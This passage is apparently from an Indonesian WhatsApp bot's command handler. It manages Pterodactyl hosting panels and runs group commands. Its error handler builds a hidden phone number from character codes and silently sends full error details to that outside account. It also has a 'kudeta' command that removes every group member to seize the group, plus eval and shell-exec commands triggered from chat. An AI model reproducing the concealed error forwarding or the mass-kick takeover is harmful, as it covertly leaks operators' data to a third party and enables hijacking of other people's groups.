                  id: `.3gb ${username}`
                },
                {
                  title: "RAM 4GB CPU 100% || User Owner",
                  description: "© Pallzz",
                  id: `.4gb ${username}`
                },
                {
                  title: "RAM 5GB CPU 120% || User Owner",
                  description: "© Pallzz",
                  id: `.5gb ${username}`
                },
                {
                  title: "RAM 6GB CPU 140% || User Owner",
                  description: "© Pallzz",
                  id: `.6gb ${username}`
                },
                {
                  title: "RAM 7GB CPU 160% || User Owner",
                  description: "© Pallzz",
                  id: `.7gb ${username}`
                },
                {
                  title: "RAM 8GB CPU 180% || User Owner",
                  description: "© Pallzz",
                  id: `.8gb ${username}`
                },
                {
                  title: "RAM 9GB CPU 200% || User Owner",
                  description: "© Pallzz",
                  id: `.9gb ${username}`
                },
                {
                  title: "RAM 10GB CPU 220% || User Owner",
                  description: "© Pallzz",
                  id: `.10gb ${username}`
                },
                {
                  title: "RAM UNLI CPU UNLI || User Owner",
                  description: "© Pallzz",
                  id: `.unli ${username}`
                }
              ]
            }
          ]
        })
      }
    }
  ],
  headerType: 4,
  viewOnce: true
}, { quoted: m });
    // Sections untuk menu Panel
  } catch (error) {
    console.error("Terjadi kesalahan:", error);
    m.reply("Maaf, terjadi kesalahan saat memproses permintaan Anda.");
  }
  break;
}
break;

case 'cpanel-v2': {
  const userId = m.sender;
  // Validasi username
  if (!args[0]) {
    return m.reply("Silakan berikan username untuk panel. Contoh: .cpanel-v2 <username>");
  }

  const username = args[0];

  try {
    // Teks utama
    let teks = `
╭───────────✦───────────╮
     *乂 List Paket Panel yang Tersedia*
╰───────────✦───────────╯

┏❐
┃• Creator X Bot : 🌟 Cpanel V3
┃• Type  : ⚔️ Case X Plugin
┃• Status: 🔥 Online
┗❐

*🌐 INFO PROFILE*
○ Pengguna : @${m.sender.split("@")[0]}
○ Username Panel: ${username}
`;
Pyz.sendMessage(m.chat, {
  caption: teks,
  footer: `🔧 *Kelola Hosting Anda dengan Mudah!* 🔧
🔑 *Hanya untuk Owner atau Admin Terpilih* 🔑`,
  image: fs.readFileSync("./src/media/thumb.jpg"),
  buttons: [
    { buttonId: '.owner', buttonText: { displayText: 'Owner Pallzz🔹' }, type: 1 },
    { buttonId: '.admin1', buttonText: { displayText: 'Owner Admin 1 🔹' }, type: 1 },
    {
      buttonId: 'single_select',
      buttonText: { displayText: '📋 Pilih Paket Panel' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: "🌐 Paket Ram Panel",
          sections: [
            {
              title: "Pilih List Cpanel",
              rows: [
                {
                  title: "RAM 1GB CPU 40% || User Reseller",
                  description: "© Pallzz",
                  id: `.1gb-v2 ${username}`
                },
                {
                  title: "RAM 2GB CPU 60% || User Reseller",
                  description: "© Pallzz",
                  id: `.2gb-v2 ${username}`
                },
                {
                  title: "RAM 3GB CPU 80% || User Reseller",
                  description: "© Pallzz",
                  id: `.3gb-v2 ${username}`
                },
                {
                  title: "RAM 4GB CPU 100% || User Reseller",
                  description: "© Pallzz",
                  id: `.4gb-v2 ${username}`
                },
                {
                  title: "RAM 5GB CPU 120% || User Reseller",
                  description: "© Pallzz",
                  id: `.5gb-v2 ${username}`
                },
                {
                  title: "RAM 6GB CPU 140% || User Reseller",
                  description: "© Pallzz",
                  id: `.6gb-v2 ${username}`
                },
                {
                  title: "RAM 7GB CPU 160% || User Reseller",
                  description: "© Pallzz",
                  id: `.7gb-v2 ${username}`
                },
                {
                  title: "RAM 8GB CPU 180% || User Reseller",
                  description: "© Pallzz",
                  id: `.8gb-v2 ${username}`
                },
                {
                  title: "RAM 9GB CPU 200% || User Reseller",
                  description: "© Pallzz",
                  id: `.9gb-v2 ${username}`
                },
                {
                  title: "RAM 10GB CPU 220% || User Reseller",
                  description: "© Pallzz",
                  id: `.10gb-v2 ${username}`
                },
                {
                  title: "RAM UNLI CPU UNLI || User Reseller",
                  description: "© Kenja",
                  id: `.unli-v2 ${username}`
                }
              ]
            }
          ]
        })
      }
    }
  ],
  headerType: 4,
  viewOnce: true
}, { quoted: m });
    // Sections untuk menu Panel
  } catch (error) {
    console.error("Terjadi kesalahan:", error);
    m.reply("Maaf, terjadi kesalahan saat memproses permintaan Anda.");
  }
  break;
}
break;

case "listadmin": {
if (!isCreator && !isreseller) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Pyz.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isreseller) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Pyz.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================


case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *#- List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Pyz.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break
case "developerbot": case "owner": {
await Pyz.sendContact(m.chat, [global.owner], m)
}
break
case "developerbot": case "admin1": {
await Pyz.sendContact(m.chat, [global.admin1], m)
}
break;

//================================================================================

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Pyz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Pyz.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//================================================================================

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Pyz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Pyz.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await Pyz.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await Pyz.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "h": case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await Pyz.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return xpaytod(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By Kenja Starting 🔥")
for (let i of memberFilter) {
await Pyz.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case "leave": {
if (!isCreator) return xpaytod(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await Pyz.groupLeave(m.chat)
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await Pyz.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Pyz.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Pyz.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: qtext})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await Pyz.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await Pyz.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: qtext})
}
break

//================================================================================

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return m.reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return m.reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

//================================================================================

case "antilink": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return m.reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return m.reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return m.reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return m.reply("Berhasil mematikan *antilink* di grup ini")
} else return m.reply(example("on/off"))
}
break

//================================================================================

case "antilink2": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return m.reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return m.reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return m.reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return m.reply("Berhasil mematikan *antilink2* di grup ini")
} else return m.reply(example("on/off"))
}
break

//================================================================================

mess.group
default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}
//================================================================================

if (m.text.toLowerCase() == "bot") {
m.reply("Bot Online ✅")
}

//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
Pyz.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});